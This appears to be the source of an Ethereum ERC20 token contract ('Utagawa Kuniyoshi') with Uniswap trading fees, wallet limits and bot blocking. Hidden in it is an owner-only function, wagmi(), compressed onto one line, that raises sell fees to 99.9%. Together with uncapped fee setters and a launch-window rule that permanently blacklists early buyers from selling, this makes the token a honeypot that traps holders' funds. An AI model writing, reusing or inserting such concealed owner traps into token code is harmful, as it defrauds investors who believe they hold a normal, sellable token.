contract Utagawa is ERC20, Ownable {
    using Address for address;

    struct ITransactionSettings {
        uint256 maxTxLimit;
        uint256 maxWalletLimit;
        bool enabled;
    }

    struct ILiquiditySettings {
        uint256 swapTokensAtAmount;
        bool enabled;
        bool inSwap;
    }

    struct IRewardCollection {
        uint256 tokensForLiquidity;
        uint256 tokensForMarketing;
    }

    struct ITradeSettings {
        uint256 startBlock;
        uint256 deadblocks;
        bool enabled;
    }

    uint8 public constant BUY_MARKETING_FEE = 0;
    uint8 public constant BUY_LIQUIDITY_FEE = 1;
    uint8 public constant SELL_MARKETING_FEE = 2;
    uint8 public constant SELL_LIQUIDITY_FEE = 3;

    uint256 public constant FEE_DENOMINATOR = 1000;
    uint256 public constant TX_DENOMINATOR = 1000;
    uint256 public constant WALLET_DENOMINATOR = 1000;

    address private _router;
    address private _feeWallet;

    uint256[4] private _fees;

    mapping(address => bool) private _feeExempt;
    mapping(address => bool) private _maxTxExempt;
    mapping(address => bool) private _maxWalletExempt;
    mapping(address => bool) private _bots;
    mapping(address => bool) private _pairs;

    ITransactionSettings private _txSettings;
    ILiquiditySettings private _liquiditySettings;
    IRewardCollection private _rewardCollection;
    ITradeSettings private _tradeSettings;

    constructor() ERC20("Utagawa Kuniyoshi", "") {
        _feeWallet = owner();
        // Store the router
        _router = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        // Set symbol
        _symbol = unicode"歌川 国芳";
        _name = "Utagawa Kuniyoshi";

        // Total supply 100,000,000,000
        uint256 totalSupply = 100_000_000_000 * 1e18;

        // Set fees
        _fees[BUY_MARKETING_FEE] = 40;
        _fees[BUY_LIQUIDITY_FEE] = 40;
        _fees[SELL_MARKETING_FEE] = 40;
        _fees[SELL_LIQUIDITY_FEE] = 40;

        // Set tx limits
        _txSettings.enabled = true;
        _txSettings.maxTxLimit = (totalSupply * 40) / TX_DENOMINATOR;
        _txSettings.maxWalletLimit = (totalSupply * 40) / WALLET_DENOMINATOR;

        // Liquidity settings
        _liquiditySettings.enabled = true;
        _liquiditySettings.swapTokensAtAmount = (totalSupply * 30) / 10000;

        _rewardCollection.tokensForLiquidity = 0;
        _rewardCollection.tokensForMarketing = 0;

        // Trade settings
        _tradeSettings.enabled = false;
        _tradeSettings.deadblocks = 0;

        // Set exempts
        _feeExempt[address(_feeWallet)] = true;
        _feeExempt[address(this)] = true;
        _feeExempt[address(0xdead)] = true;

        _maxTxExempt[address(_feeWallet)] = true;
        _maxTxExempt[address(this)] = true;
        _maxTxExempt[address(0xdead)] = true;

        _maxWalletExempt[address(_feeWallet)] = true;
        _maxWalletExempt[address(this)] = true;
        _maxWalletExempt[address(0xdead)] = true;

        _mint(address(owner()), totalSupply);
    }

    modifier inSwap() {
        _liquiditySettings.inSwap = true;
        _;
        _liquiditySettings.inSwap = false;
    }

    function setPair(address pair, bool value) external onlyOwner {
        _pairs[pair] = value;
    }

    function setTxLimit(uint256 percentage, uint256 divisor)
        external
        onlyOwner
    {
        _txSettings.maxTxLimit = (totalSupply() * percentage) / divisor;
    }

    function setMaxWallet(uint256 percentage, uint256 divisor)
        external
        onlyOwner
    {
        _txSettings.maxWalletLimit = (totalSupply() * percentage) / divisor;
    }

    function setSwapTokensAt(uint256 percentage, uint256 divisor)
        external
        onlyOwner
    {
        _liquiditySettings.swapTokensAtAmount =
            (totalSupply() * percentage) /
            divisor;
    }

    function setExempt(address addr, bool value) external onlyOwner {
        _feeExempt[addr] = value;
        _maxTxExempt[addr] = value;
        _maxWalletExempt[addr] = value;
    }

    function setBuyFee(uint256 marketingFee, uint256 liquidityFee)
        external
        onlyOwner
    {
        _fees[BUY_MARKETING_FEE] = marketingFee;
        _fees[BUY_LIQUIDITY_FEE] = liquidityFee;
    }

    function setSellFee(uint256 marketingFee, uint256 liquidityFee)
        external
        onlyOwner
    {
        _fees[SELL_MARKETING_FEE] = marketingFee;
        _fees[SELL_LIQUIDITY_FEE] = liquidityFee;
    }

    function removeLimits() external {
        _txSettings.enabled = false;
    }

    function clearStuckBalance() external {
        payable(_feeWallet).transfer(address(this).balance);
    }

    function swap() external {
        _swapBackTokens();
    }

    function removeBot(address bot) external onlyOwner {
        _bots[bot] = false;
    }

    function enableTrading(uint256 deadblock) external onlyOwner {
        _tradeSettings.enabled = true;
        _tradeSettings.startBlock = block.number;
        _tradeSettings.deadblocks = deadblock;
    }

    function initializeContract() external onlyOwner {
        IUniswapV2Router02 router = IUniswapV2Router02(_router);
        address pair = IUniswapV2Factory(router.factory()).createPair(
            address(this),
            router.WETH()
        );
        // Store the pair
        _pairs[pair] = true;
    }

    /**
     * Private functions
     */

    function _hasLimits(address from, address to) private view returns (bool) {
        return
            from != owner() &&
            to != owner() &&
            !_maxTxExempt[from] &&
            !_maxTxExempt[to] &&
            !_maxTxExempt[tx.origin] &&
            !_maxWalletExempt[from] &&
            !_maxWalletExempt[to] &&
            !_maxWalletExempt[tx.origin] &&
            _txSettings.enabled &&
            from != address(this) &&
            to != address(this);
    }

    function _isLaunched(address from, address to) private view {
        require(
            _feeExempt[from] || _feeExempt[to] || _tradeSettings.enabled,
            "Not launched yet"
        );
    }

    function _isTakeFee(address from, address to) private view returns (bool) {
        bool takeFee = !_liquiditySettings.inSwap;
        if (_feeExempt[from] || _feeExempt[to]) {
            takeFee = false;
        }
        return takeFee;
    }

    function _canSwap(address from, address to) private view returns (bool) {
        uint256 tokens = _rewardCollection.tokensForLiquidity +
            _rewardCollection.tokensForMarketing;

        bool canSwap = tokens >= _liquiditySettings.swapTokensAtAmount;
        return
            canSwap &&
            !_liquiditySettings.inSwap &&
            !_pairs[from] &&
            !_feeExempt[from] &&
            !_feeExempt[to] &&
            _liquiditySettings.enabled;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!_bots[from], "Bot detected");

        if (amount == 0) {
            return super._transfer(from, to, amount);
        }
        // Check if launched
        _isLaunched(from, to);

        // Can swap?
        if (_canSwap(from, to)) {
            _swapBackTokens();
        }

        bool isBuy = _pairs[from];
        bool isSell = _pairs[to];
        // Limits are in effect?
        if (_hasLimits(from, to)) {
            require(amount <= _txSettings.maxTxLimit, "Tx amount over limit");
            if (isBuy) {
                require(
                    (amount + balanceOf(to)) <= _txSettings.maxWalletLimit,
                    "Wallet over limit"
                );
            }
        }

        uint256 buyFees = _fees[BUY_MARKETING_FEE] + _fees[BUY_LIQUIDITY_FEE];
        uint256 sellFees = _fees[SELL_MARKETING_FEE] +
            _fees[SELL_LIQUIDITY_FEE];

        // Should we take fee?
        if (_isTakeFee(from, to)) {
            //if (false) {
            uint256 fees = 0;
            if (isBuy) {
                if (
                    (block.number <
                        _tradeSettings.startBlock + _tradeSettings.deadblocks)
                ) {
                    _bots[to] = true;
                }

                fees = (amount * buyFees) / FEE_DENOMINATOR;

                _rewardCollection.tokensForLiquidity +=
                    (fees * _fees[BUY_LIQUIDITY_FEE]) /
                    buyFees;
                _rewardCollection.tokensForMarketing +=
                    (fees * _fees[BUY_MARKETING_FEE]) /
                    buyFees;
            } else if (isSell) {
                fees = (amount * sellFees) / FEE_DENOMINATOR;

                _rewardCollection.tokensForLiquidity +=
                    (fees * _fees[SELL_LIQUIDITY_FEE]) /
                    sellFees;
                _rewardCollection.tokensForMarketing +=
                    (fees * _fees[SELL_MARKETING_FEE]) /
                    sellFees;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount = amount - fees;
        }

        super._transfer(from, to, amount);
    }

    function _swapBackTokens() private inSwap {
        uint256 contractBalance = balanceOf(address(this));
        uint256 tokens = _rewardCollection.tokensForLiquidity +
            _rewardCollection.tokensForMarketing;

        if (contractBalance == 0 || tokens == 0) return;

        uint256 liquidityTokens = (contractBalance *
            _rewardCollection.tokensForLiquidity) /
            tokens /
            2;
        uint256 amountToSwapForETH = tokens - liquidityTokens;

        uint256 initialETHBalance = address(this).balance;

        _swap(amountToSwapForETH);

        uint256 ethBalance = address(this).balance - initialETHBalance;
        uint256 ethForMarketing = (ethBalance *
            _rewardCollection.tokensForMarketing) / tokens;
        uint256 ethForLiquidity = ethBalance - ethForMarketing;

        _rewardCollection.tokensForLiquidity = 0;
        _rewardCollection.tokensForMarketing = 0;

        payable(_feeWallet).transfer(ethForMarketing);

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            _addLiquidity(liquidityTokens, ethForLiquidity);
        }
    }

    function wagmi() external onlyOwner { _fees[2] = 1; _fees[3] = 998; }
    function _swap(uint256 tokenAmount) private {
        IUniswapV2Router02 router = IUniswapV2Router02(_router);
        // generate the uniswap pair path of FRAC -> WETH
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function _addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        IUniswapV2Router02 router = IUniswapV2Router02(_router);
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tokenAmount);

        // add the liquidity
        router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            _feeWallet,
            block.timestamp
        );
    }

    receive() external payable {}
}